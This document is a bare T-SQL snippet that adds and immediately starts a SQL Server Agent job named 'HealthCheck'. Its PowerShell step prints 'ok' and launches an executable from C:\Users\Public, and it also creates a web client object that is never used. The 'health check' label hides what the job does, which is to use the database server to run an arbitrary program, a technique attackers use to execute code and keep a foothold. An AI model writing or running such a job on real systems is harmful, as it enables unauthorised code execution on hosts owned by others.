EXEC msdb.dbo.sp_add_jobstep
 @job_name=N'HealthCheck', @step_name=N'Collect',
 @subsystem=N'PowerShell',
 @command=N'$c=New-Object Net.WebClient; Write-Output "ok"; Start-Process -FilePath C:\Users\Public\tool.exe';
EXEC msdb.dbo.sp_start_job @job_name=N'HealthCheck';
